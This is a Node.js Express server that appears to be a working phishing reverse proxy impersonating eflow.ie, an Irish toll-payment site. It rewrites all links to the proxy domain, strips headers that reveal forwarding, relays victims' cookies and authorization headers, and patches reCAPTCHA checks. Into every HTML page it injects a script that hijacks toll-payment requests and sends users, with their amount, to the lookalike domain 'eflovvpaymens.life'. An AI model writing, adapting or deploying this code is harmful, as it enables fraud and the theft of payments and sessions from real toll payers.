const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const expressWs = require('express-ws');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const config = require('./config');
const logger = require('./logger');
const { userAgentRotation, getRandomUserAgent } = require('./user-agents');
const cacheManager = require('./cache-manager');

// Create Express app
const app = express();

// Enable WebSocket support
if (config.features.websocket) {
  expressWs(app);
}

// Trust proxy if configured
if (config.server.trustProxy) {
  app.set('trust proxy', true);
}

// Middleware: Security headers (relaxed for proxy)
app.use(
  helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
    crossOriginOpenerPolicy: false,
    crossOriginResourcePolicy: false,
  })
);

// Middleware: Compression - DISABLED to prevent double compression
// The proxy will handle compression via responseInterceptor
// if (config.features.compression) {
//   app.use(compression());
// }

// Middleware: Rate Limiting (look like normal user)
const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  max: process.env.NODE_ENV === 'production' ? 30 : 60, // Lower in production
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: 'Too many requests, please slow down',
  skip: (req) => {
    // Skip rate limiting for static resources and health checks
    if (req.url === '/health' || req.url === '/cache-stats') return true;
    return req.url.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot)$/);
  },
});

app.use(limiter);

// Middleware: User-Agent rotation
app.use(userAgentRotation);

// Middleware: Cache check
app.use(cacheManager.cacheMiddleware);

// Middleware: Cookie parser
app.use(cookieParser());

// Middleware: Body parser - DISABLED for proxy
// Let http-proxy-middleware handle raw body forwarding
// app.use(express.json({ limit: '50mb' }));
// app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Middleware: Request logging (Morgan)
app.use(
  morgan('combined', {
    stream: {
      write: (message) => logger.info(message.trim()),
    },
    skip: (req) => !config.logging.logRequests,
  })
);

// Custom request timing middleware
app.use((req, res, next) => {
  req.startTime = Date.now();
  
  // Log response
  res.on('finish', () => {
    const responseTime = Date.now() - req.startTime;
    logger.logRequest(req, res, responseTime);
  });
  
  next();
});

// Health check endpoint (minimal info for security)
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
  });
});

// Cache stats endpoint (protected, only in dev)
app.get('/cache-stats', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).send('Not Found');
  }
  res.json(cacheManager.getStats());
});

// Clear cache endpoint (protected, only in dev)
app.post('/clear-cache', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).send('Not Found');
  }
  cacheManager.clear();
  res.json({ message: 'Cache cleared' });
});

// Proxy configuration
const proxyOptions = {
  target: config.target.url,
  changeOrigin: true,
  ws: config.features.websocket,
  timeout: config.target.timeout,
  proxyTimeout: config.target.timeout,
  
  // CRITICAL: Parse body to forward properly
  parseReqBody: true,
  
  // CRITICAL: Self-handle response to use responseInterceptor
  selfHandleResponse: true,
  
  // Forward cookies and sessions
  cookieDomainRewrite: {
    '*': '',
  },
  cookiePathRewrite: {
    '*': '/',
  },
  
  // Auto-rewrite redirects
  autoRewrite: true,
  followRedirects: true,
  
  // Preserve host header for proper routing
  preserveHeaderKeyCase: true,
  
  // Handle all HTTP methods
  onProxyReq: (proxyReq, req, res) => {
    // Log proxy request
    logger.debug(`Proxying ${req.method} ${req.url} to ${config.target.url}`);
    
    // === USER-AGENT ROTATION ===
    // Use random User-Agent to look like different browsers
    if (req.randomUserAgent) {
      proxyReq.setHeader('User-Agent', req.randomUserAgent);
    }
    
    // === FINGERPRINT REMOVAL ===
    // Remove headers that expose proxy/forwarding
    proxyReq.removeHeader('X-Forwarded-For');
    proxyReq.removeHeader('X-Forwarded-Host');
    proxyReq.removeHeader('X-Forwarded-Proto');
    proxyReq.removeHeader('X-Real-IP');
    proxyReq.removeHeader('Via');
    proxyReq.removeHeader('Forwarded');
    
    // Remove rate limit headers
    proxyReq.removeHeader('RateLimit');
    proxyReq.removeHeader('RateLimit-Policy');
    proxyReq.removeHeader('RateLimit-Limit');
    proxyReq.removeHeader('RateLimit-Remaining');
    proxyReq.removeHeader('RateLimit-Reset');
    
    // Forward cookies properly
    if (req.headers.cookie) {
      proxyReq.setHeader('Cookie', req.headers.cookie);
    }
    
    // Forward authorization headers
    if (req.headers.authorization) {
      proxyReq.setHeader('Authorization', req.headers.authorization);
    }
    
    // Forward CSRF tokens
    const csrfHeaders = [
      'x-csrf-token',
      'x-xsrf-token',
      'x-requested-with',
    ];
    
    csrfHeaders.forEach((header) => {
      if (req.headers[header]) {
        proxyReq.setHeader(header, req.headers[header]);
      }
    });
    
    // Set realistic Accept headers
    if (!proxyReq.getHeader('Accept')) {
      proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    }
    if (!proxyReq.getHeader('Accept-Language')) {
      proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.9');
    }
    if (!proxyReq.getHeader('Accept-Encoding')) {
      proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    }
    
    // Handle form data and JSON body - DON'T modify!
    // Express already parsed the body, http-proxy-middleware will handle it
    // We just need to make sure we don't interfere
  },
  
  // Use 'on' object for event handlers (new API for v3)
  on: {
    // Handle response with responseInterceptor for automatic decompression
    proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
      // Log proxy response
      logger.debug(`Received response ${proxyRes.statusCode} for ${req.url}`);
      
      // === CACHING LOGIC ===
      // Cache successful GET responses
      if (cacheManager.shouldCache(req, { statusCode: proxyRes.statusCode })) {
        cacheManager.set(req, {
          body: responseBuffer,
          contentType: proxyRes.headers['content-type'],
          statusCode: proxyRes.statusCode,
        });
        
        logger.debug(`Cached response for ${req.url}`);
      }
      
      // Handle cookies - rewrite domain if custom domain is set
      if (proxyRes.headers['set-cookie']) {
        const cookies = proxyRes.headers['set-cookie'].map((cookie) => {
          let modifiedCookie = cookie;
          
          // Remove Secure flag for local development
          if (req.protocol === 'http') {
            modifiedCookie = modifiedCookie.replace(/;\s*Secure/gi, '');
          }
          
          // Rewrite domain if custom domain is set
          if (config.customDomain) {
            const targetDomain = new URL(config.target.url).hostname;
            modifiedCookie = modifiedCookie.replace(
              new RegExp(`Domain=${targetDomain}`, 'gi'),
              `Domain=${config.customDomain}`
            );
          }
          
          return modifiedCookie;
        });
        
        res.setHeader('set-cookie', cookies);
      }
      
      // Handle CORS headers
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      
      // Handle content rewriting
      const contentType = proxyRes.headers['content-type'] || '';
      const targetDomain = new URL(config.target.url).hostname; // eflow.ie
      const proxyDomain = req.get('host'); // swa-production.up.railway.app
      
      // ALWAYS do domain replacement for HTML/JS/CSS
      if (
        contentType.includes('text/html') ||
        contentType.includes('application/javascript') ||
        contentType.includes('text/css') ||
        contentType.includes('application/json')
      ) {
        // responseBuffer is already decompressed by responseInterceptor!
        let bodyString = responseBuffer.toString('utf8');
        
        // CRITICAL: Replace ALL forms of target domain with proxy domain
        // This keeps users on proxy site instead of redirecting to original
        
        // Replace http://eflow.ie
        bodyString = bodyString.replace(
          new RegExp('http://eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace https://eflow.ie
        bodyString = bodyString.replace(
          new RegExp('https://eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace http://www.eflow.ie
        bodyString = bodyString.replace(
          new RegExp('http://www\\.eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace https://www.eflow.ie
        bodyString = bodyString.replace(
          new RegExp('https://www\\.eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace just "eflow.ie" (in href attributes, etc)
        bodyString = bodyString.replace(
          new RegExp('(["\'])eflow\\.ie', 'gi'),
          `$1${proxyDomain}`
        );
        
        // Replace custom domain if set
        if (config.customDomain) {
          bodyString = bodyString.replace(
            new RegExp(targetDomain, 'g'),
            config.customDomain
          );
        }
          
          // MINIMAL reCAPTCHA fix for HTML pages
          if (contentType.includes('text/html')) {
            const targetOrigin = config.target.url; // https://eflow.ie
            const proxyOrigin = `${req.protocol}://${proxyDomain}`;
            
            // Encode domains for reCAPTCHA 'co' parameter
            const targetBase64 = Buffer.from(`${targetOrigin}:443`).toString('base64').replace(/=/g, '.');
            const proxyBase64 = Buffer.from(`${proxyOrigin}:443`).toString('base64').replace(/=/g, '.');
            
            // Inject minimal script to fix reCAPTCHA domain
            const recaptchaFixScript = `
<script>
(function() {
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    let url = args[0];
    if (typeof url === 'string' && url.includes('google.com/recaptcha')) {
      url = url.replace(/co=` + proxyBase64 + `/g, 'co=` + targetBase64 + `');
      args[0] = url;
    }
    return originalFetch.apply(this, args);
  };
})();
</script>`;
            
            // UNIVERSAL Payment Redirect - Works on ALL pages
            const PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
            
            const universalPaymentRedirectScript = `
<script>
(function() {
  const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
  
  console.log('[Payment Redirect] Universal interceptor loaded');
  
  // Intercept XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  
  XMLHttpRequest.prototype.open = function(method, url) {
    this._method = method;
    this._url = url;
    return originalXHROpen.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.send = function(body) {
    // Check if this is a Pay request
    if (this._method === 'POST' && this._url && this._url.includes('/pay-toll')) {
      console.log('[Payment Redirect] Intercepted AJAX POST to /pay-toll');
      
      // Extract amount from body or page
      let amount = null;
      
      // Try to get from request body
      if (body && typeof body === 'string') {
        const match = body.match(/total_payment=([\\d.]+)/);
        if (match) amount = match[1];
      }
      
      // Try to get from hidden input on page
      if (!amount) {
        const totalInput = document.querySelector('input[name="total_payment"]');
        if (totalInput) amount = totalInput.value;
      }
      
      // Try to get from any input with decimal format
      if (!amount) {
        const allInputs = document.querySelectorAll('input');
        for (let inp of allInputs) {
          if (inp.value && inp.value.match(/^\\d+\\.\\d{2}$/)) {
            amount = inp.value;
            break;
          }
        }
      }
      
      if (amount && parseFloat(amount) > 0) {
        console.log('[Payment Redirect] Amount found:', amount);
        console.log('[Payment Redirect] Redirecting to payment system...');
        
        // Cancel AJAX request
        this.abort();
        
        // Redirect to payment system
        window.location.href = PAYMENT_URL + '?amount=' + amount;
        return;
      }
    }
    
    return originalXHRSend.apply(this, arguments);
  };
  
  // Intercept Fetch API
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    if (options && options.method === 'POST' && typeof url === 'string' && url.includes('/pay-toll')) {
      console.log('[Payment Redirect] Intercepted Fetch POST to /pay-toll');
      
      // Extract amount
      let amount = null;
      
      if (options.body) {
        const bodyStr = typeof options.body === 'string' ? options.body : '';
        const match = bodyStr.match(/total_payment=([\\d.]+)/);
        if (match) amount = match[1];
      }
      
      if (!amount) {
        const totalInput = document.querySelector('input[name="total_payment"]');
        if (totalInput) amount = totalInput.value;
      }
      
      if (amount && parseFloat(amount) > 0) {
        console.log('[Payment Redirect] Amount found:', amount);
        console.log('[Payment Redirect] Redirecting to payment system...');
        
        // Redirect instead of making request
        window.location.href = PAYMENT_URL + '?amount=' + amount;
        
        // Return dummy promise
        return Promise.reject(new Error('Redirecting to payment system'));
      }
    }
    
    return originalFetch.apply(this, arguments);
  };
  
  console.log('[Payment Redirect] AJAX/Fetch interceptors installed');
})();
</script>`;
            
            // Inject scripts on ALL HTML pages
            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript;
            
            // Inject before </head> or first <script>
            if (bodyString.includes('</head>')) {
              bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
            } else if (bodyString.includes('<script')) {
              bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
            }
          }
          
          return bodyString;
        }
      }
      
      // Return unmodified buffer for other content types
      return responseBuffer;
    }),
    
    // Error handling
    error: (err, req, res) => {
      logger.error('Proxy error', {
        error: err.message,
        url: req.url,
        method: req.method,
      });
      
      if (!res.headersSent) {
        res.status(502).json({
          error: 'Proxy Error',
          message: 'Failed to proxy request',
          details: err.message,
        });
      }
    },
  },
  
  // Error handling
  onError: (err, req, res) => {
    logger.error('Proxy error', {
      error: err.message,
      url: req.url,
      method: req.method,
    });
    
    res.status(502).json({
      error: 'Proxy Error',
      message: 'Failed to proxy request',
      details: err.message,
    });
  },
  
  // Log provider
  logLevel: config.logging.level === 'debug' ? 'debug' : 'warn',
};

// Apply proxy middleware to all routes
app.use('/', createProxyMiddleware(proxyOptions));

// WebSocket proxy
if (config.features.websocket) {
  app.ws('/*', (ws, req) => {
    logger.info(`WebSocket connection established: ${req.url}`);
    
    const WebSocket = require('ws');
    const targetUrl = config.target.url.replace('http', 'ws') + req.url;
    const proxyWs = new WebSocket(targetUrl, {
      headers: {
        'Origin': config.target.url,
        'User-Agent': req.headers['user-agent'],
      },
    });
    
    // Forward messages from client to target
    ws.on('message', (msg) => {
      if (proxyWs.readyState === WebSocket.OPEN) {
        proxyWs.send(msg);
      }
    });
    
    // Forward messages from target to client
    proxyWs.on('message', (msg) => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
      }
    });
    
    // Handle errors
    proxyWs.on('error', (err) => {
      logger.error('WebSocket proxy error', { error: err.message });
      ws.close();
    });
    
    ws.on('error', (err) => {
      logger.error('WebSocket client error', { error: err.message });
      proxyWs.close();
    });
    
    // Handle close
    proxyWs.on('close', () => {
      ws.close();
    });
    
    ws.on('close', () => {
      proxyWs.close();
    });
  });
}

// Global error handler
app.use((err, req, res, next) => {
  logger.error('Application error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
  });
  
  res.status(500).json({
    error: 'Internal Server Error',
    message: err.message,
  });
});

// Start server
const server = app.listen(config.server.port, config.server.host, () => {
  logger.info('='.repeat(60));
  logger.info('🚀 Reverse Proxy Server Started');
  logger.info('='.repeat(60));
  logger.info(`Target URL: ${config.target.url}`);
  logger.info(`Listening on: ${config.server.host}:${config.server.port}`);
  logger.info(`WebSocket: ${config.features.websocket ? 'Enabled' : 'Disabled'}`);
  logger.info(`Compression: ${config.features.compression ? 'Enabled' : 'Disabled'}`);
  logger.info(`Log Level: ${config.logging.level}`);
  logger.info('='.repeat(60));
});

// Graceful shutdown
process.on('SIGTERM', () => {
  logger.info('SIGTERM signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  logger.info('SIGINT signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

module.exports = app;

